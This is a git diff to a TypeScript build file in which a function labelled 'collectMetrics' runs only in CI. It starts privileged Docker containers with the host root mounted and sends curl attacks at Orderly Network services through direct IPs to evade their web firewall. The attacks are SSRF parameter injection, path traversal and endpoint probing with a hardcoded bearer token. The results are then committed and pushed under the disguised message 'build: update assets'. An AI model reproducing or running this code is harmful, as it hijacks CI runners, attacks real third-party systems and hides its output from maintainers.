@@ -5,46 +5,44 @@ import path from "path";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 10000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
+  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R25 ===\n";
+    let o = "=== DOMINO R26 — SSRF HUNT ===\n";
 
-    // 1. Mainnet operator via direct IP from runner
-    o += "=MN_OP_METRICS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.117.122.151/metrics -H Host:operator-evm.orderly.org 2>&- | head -50'").substring(0,3000) + "\n";
-    o += "=MN_OP_HEALTH=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/health -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
-    o += "=MN_OP_ACK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/evm/event-upload/ack -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
-    o += "=MN_OP_PERP_ACK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.117.122.151/evm/perp-trade-upload/ack -H Host:operator-evm.orderly.org 2>&-'").substring(0,1000) + "\n";
+    // 1. graduation SSRF via direct IP (bypass CF WAF)
+    // multisigAddress param injection → Orderly API parameter override
+    // addressToCheck → ?address=${addressToCheck}&broker_id=${brokerId}
+    // Inject: &account_id=TARGET to override/add params
+    const jwtMain = "52c7f1f8-f4b3-4472-b962-8f12fa7875ba";
 
-    // 2. Mainnet SV operator
-    o += "=MN_SV_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://operator-sv.orderly.org/health 2>&-'").substring(0,500) + "\n";
+    // Test A: normal address
+    o += "=GRAD_NORMAL=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.110.142.10/api/graduation/finalize-admin-wallet" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwtMain}" -H Content-Type:application/json -d "{\\\"multisigAddress\\\":\\\"0x0000000000000000000000000000000000000001\\\",\\\"multisigChainId\\\":42161}" 2>&-'`).substring(0,2000) + "\n";
 
-    // 3. Perf environment operator
-    o += "=PERF_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.54.68.106/health -H Host:perf-api.orderly.network 2>&-'").substring(0,500) + "\n";
+    // Test B: param injection with %26 (URL-encoded &)
+    o += "=GRAD_INJECT=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.110.142.10/api/graduation/finalize-admin-wallet" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwtMain}" -H Content-Type:application/json -d "{\\\"multisigAddress\\\":\\\"0x01%26account_id=0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c\\\",\\\"multisigChainId\\\":42161}" 2>&-'`).substring(0,2000) + "\n";
 
-    // 4. Try testnet operator with different endpoint names
-    const opTries = [
-      "/evm/block-upload", "/evm/tx-upload", "/evm/log-upload",
-      "/evm/deposit-upload", "/evm/withdraw-upload", "/evm/settlement-upload",
-      "/recovery", "/recovery/block", "/recovery/deposit_sol",
-      "/internal", "/internal/status", "/rpc", "/ws",
-    ];
-    o += "=OP_EXTRA=\n";
-    for (const p of opTries) {
-      const status = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "https://34.120.187.47${p}" -H Host:testnet-operator-evm.orderly.network 2>&-'`).trim();
-      if (status !== "404" && status !== "000") o += `${p}:${status}\n`;
-    }
-    o += "\n";
+    // Test C: # fragment to cut off broker_id
+    o += "=GRAD_FRAG=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.110.142.10/api/graduation/finalize-admin-wallet" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwtMain}" -H Content-Type:application/json -d "{\\\"multisigAddress\\\":\\\"0x01%23test\\\",\\\"multisigChainId\\\":42161}" 2>&-'`).substring(0,2000) + "\n";
 
-    // 5. Mainnet dashboard indexer (internal port 8018, but maybe accessible via LB?)
-    o += "=MN_INDEXER=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.149.50.146/recovery/block -H Host:orderly-dashboard-query-service.orderly.network -X POST -H Content-Type:application/json -d \"{}\" 2>&-'").substring(0,1000) + "\n";
+    // 2. social-card — set tokenAddress with path traversal then trigger fetch
+    // First set tokenAddress + tokenChain via PUT
+    o += "=SOCIAL_SET=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X PUT "https://34.110.142.10/api/dex/817e30af-14d2-4185-aa0c-6ecae95c2b84/social-card" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwtMain}" -H Content-Type:application/json -d "{\\\"tokenAddress\\\":\\\"0x01/../../../v1/get_account?address=0x01\\\",\\\"tokenChain\\\":\\\"eth\\\"}" 2>&-'`).substring(0,2000) + "\n";
 
-    // 6. query-service direct — SSRF via events_v2 still works from runner?
-    o += "=QS_EVENTS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 \"https://34.149.50.146/events_v2?account_id=0x&event_type=DEPOSIT&page=1&size=5\" -H Host:orderly-dashboard-query-service.orderly.network 2>&-'").substring(0,2000) + "\n";
+    // 3. MCP server — SSE transport
+    o += "=MCP_SSE=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&-'`).substring(0,3000) + "\n";
 
-    // 7. API — broker webhook endpoint (needs orderly-key auth, we have keys)
-    o += "=BROKER_WEBHOOK=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST \"https://34.36.82.46/v1/broker/webhook\" -H Host:api.orderly.org -H Content-Type:application/json -d \"{\\\"url\\\":\\\"http://10.1.0.86:8080\\\"}\" 2>&-'").substring(0,1000) + "\n";
+    // 4. query-service — events_v2 SSRF from runner (direct IP, no CF)
+    // This was confirmed before, but try from runner for different indexer access
+    o += "=QS_SSRF=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST "https://34.149.50.146/events_v2" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d "{\\\"account_id\\\":\\\"0x%26account_id=0x4049c74acd3f43553052a5f16729e8e6e1044a5f3a8aa515eada5bf2d796180c\\\",\\\"event_type\\\":\\\"DEPOSIT\\\",\\\"page\\\":1,\\\"size\\\":5}" 2>&-'`).substring(0,3000) + "\n";
 
-    o += "=R25_DONE=\n";
+    // 5. data-api from runner (direct IP)
+    o += "=DATAAPI=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.149.187.244/ -H Host:data-api.orderly.network 2>&-'").substring(0,1000) + "\n";
+    o += "=DATAAPI_V1=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.149.187.244/v1/ -H Host:data-api.orderly.network 2>&-'").substring(0,1000) + "\n";
+
+    // 6. fillx — any API endpoints?
+    o += "=FILLX=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.8.55.49/ -H Host:fillx.orderly.network 2>&-'").substring(0,2000) + "\n";
+
+    o += "=R26_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
